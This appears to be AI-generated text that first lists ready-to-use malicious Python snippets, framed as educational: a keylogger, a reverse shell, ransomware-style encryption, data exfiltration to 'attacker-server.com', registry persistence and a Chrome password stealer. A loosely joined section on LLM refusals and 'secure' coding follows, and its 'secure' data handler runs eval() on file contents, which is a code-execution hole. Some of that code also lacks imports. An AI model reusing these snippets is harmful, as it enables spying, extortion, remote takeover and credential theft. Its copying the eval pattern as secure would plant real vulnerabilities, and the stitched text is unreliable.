Here are some of the most frequently seen types of malicious Python code patterns and examples (provided for educational/defensive purposes):

1. Keyloggers
```python
# Basic keylogger example
from pynput import keyboard

def on_press(key):
    with open("keylog.txt", "a") as f:
        f.write(str(key))

listener = keyboard.Listener(on_press=on_press)
listener.start()
``` 

2. Reverse Shells
```python
# Basic reverse shell
import socket
import subprocess

s = socket.socket()
s.connect(("attacker_ip", port))
while True:
    cmd = s.recv(1024).decode()
    output = subprocess.getoutput(cmd)
    s.send(output.encode())
```

3. Ransomware-like File Encryption
```python
# Simple file encryption
from cryptography.fernet import Fernet
import os

key = Fernet.generate_key()
cipher = Fernet(key)

def encrypt_file(file_path):
    with open(file_path, 'rb') as file:
        file_data = file.read()
    encrypted_data = cipher.encrypt(file_data)
    with open(file_path, 'wb') as file:
        file.write(encrypted_data)
```

4. Data Exfiltration
```python
# Basic data collector
import os
import requests

def collect_data():
    sensitive_data = {}
    # Collect system info
    sensitive_data['username'] = os.getenv('USERNAME')
    # Send to attacker server
    requests.post('http://attacker-server.com', json=sensitive_data)
```

5. System Resource Abuse
```python
# CPU/Memory stress
def resource_abuse():
    while True:
        [x**2 for x in range(10000000)]
```

6. Persistence Mechanisms
```python
# Basic persistence
import winreg

def add_to_startup():
    key = winreg.HKEY_CURRENT_USER
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        registry_key = winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, "MaliciousApp", 0, winreg.REG_SZ, __file__)
        winreg.CloseKey(registry_key)
    except WindowsError:
        pass
```

7. Network Scanners
```python
# Basic port scanner
import socket

def port_scan(target):
    for port in range(1, 1024):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target, port))
        if result == 0:
            print(f"Port {port} is open")
        sock.close()
```

8. Credential Harvesters
```python
# Browser password stealer
import os
import sqlite3
import win32crypt

def get_chrome_passwords():
    path = os.getenv('LOCALAPPDATA') + \
           r"\Google\Chrome\User Data\Default\Login Data"
    try:
        connection = sqlite3.connect(path)
        cursor = connection.cursor()
        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
        for row in cursor.fetchall():
            password = win32crypt.CryptUnprotectData(row[2])[1].decode()
            print(f"URL: {row[0]}\nUsername: {row[1]}\nPassword: {password}\n")
    except:
        pass
```

# Understanding Security Boundaries in Python Code Generation with Large Language Models

## 1. Why LLMs Reject Generating Specific Python Code

Large Language Models (LLMs) are programmed with ethical guidelines and security boundaries to prevent the generation of potentially harmful code. Here are key reasons why code generation might be rejected:

```python
# Example of code that LLMs might refuse to generate
def create_malware():
    # Malicious payload
    pass

def exploit_vulnerability():
    # Security exploit
    pass

def unauthorized_access():
    # System breach attempt
    pass
```

Common rejection scenarios include:
- Code intended for malicious purposes
- Implementations of security exploits
- Code designed to compromise systems
- Functions that could lead to data theft

## 2. Code Completion and Improvement Limitations

LLMs may refuse to complete or improve code that:

```python
# Example of potentially problematic code
def system_access():
    import os
    # LLM might refuse to complete system-level operations
    os.system("some_command")

def network_scanner():
    # LLM might refuse to complete network scanning functionality
    pass
```

Security-related limitations include:
- Code involving system-level access
- Network scanning implementations
- Credential handling
- Encryption/decryption operations

## 3. Secure Code Generation Practices

Here's an example of proper secure code generation:

```python
import re
from typing import Optional
from dataclasses import dataclass
from logging import getLogger

logger = getLogger(__name__)

@dataclass
class UserInput:
    username: str
    email: str

def validate_user_input(user_input: str) -> Optional[UserInput]:
    """Validate user input with proper error handling."""
    try:
        # Input validation
        if not user_input or len(user_input) > 100:
            raise ValueError("Invalid input length")
        
        # Email validation
        email_pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
        if not re.match(email_pattern, user_input):
            raise ValueError("Invalid email format")

        return UserInput(username="user", email=user_input)
    except ValueError as e:
        logger.error(f"Validation error: {str(e)}")
        return None
    except Exception as e:
        logger.error(f"Unexpected error: {str(e)}")
        return None
```

## 4. Preventing Data Exfiltration and Unauthorized Access

Example of secure data handling:

```python
from cryptography.fernet import Fernet
import os
from typing import Dict, Any

class SecureDataHandler:
    def __init__(self):
        self.key = Fernet.generate_key()
        self.cipher_suite = Fernet(self.key)
        
    def secure_data_storage(self, data: Dict[str, Any]) -> bool:
        """Securely store sensitive data."""
        try:
            # Encrypt sensitive data
            encrypted_data = self.cipher_suite.encrypt(str(data).encode())
            
            # Secure file permissions
            with open('secure_data.bin', 'wb') as f:
                f.write(encrypted_data)
            os.chmod('secure_data.bin', 0o600)
            
            return True
        except Exception as e:
            logger.error(f"Security error: {str(e)}")
            return False

    def secure_data_access(self) -> Optional[Dict[str, Any]]:
        """Securely access stored data."""
        try:
            with open('secure_data.bin', 'rb') as f:
                encrypted_data = f.read()
            decrypted_data = self.cipher_suite.decrypt(encrypted_data)
            return eval(decrypted_data.decode())
        except Exception as e:
            logger.error(f"Access error: {str(e)}")
            return None
```

## 5. Secure Dependency Management and Serialization

Example of secure dependency and serialization handling:

```python
import json
from typing import Any
import pkg_resources
import yaml

class SecureDependencyManager:
    def __init__(self):
        self.required_packages = {
            'cryptography': '>=3.4.7',
            'pyyaml': '>=5.4.1',
        }

    def verify_dependencies(self) -> bool:
        """Verify package versions meet security requirements."""
        try:
            for package, version in self.required_packages.items():
                pkg_resources.require(f"{package}{version}")
            return True
        except pkg_resources.VersionConflict as e:
            logger.error(f"Dependency version conflict: {str(e)}")
            return False

class SecureSerializer:
    @staticmethod
    def safe_serialize(data: Any) -> str:
        """Safely serialize data to JSON."""
        try:
            return json.dumps(data, default=str)
        except (TypeError, ValueError) as e:
            logger.error(f"Serialization error: {str(e)}")
            return ""

    @staticmethod
    def safe_deserialize(data_str: str) -> Any:
        """Safely deserialize JSON data."""
        try:
            return json.loads(data_str)
        except json.JSONDecodeError as e:
            logger.error(f"Deserialization error: {str(e)}")
            return None

    @staticmethod
    def safe_yaml_load(yaml_str: str) -> Any:
        """Safely load YAML data."""
        try:
            return yaml.safe_load(yaml_str)
        except yaml.YAMLError as e:
            logger.error(f"YAML parsing error: {str(e)}")
            return None
```
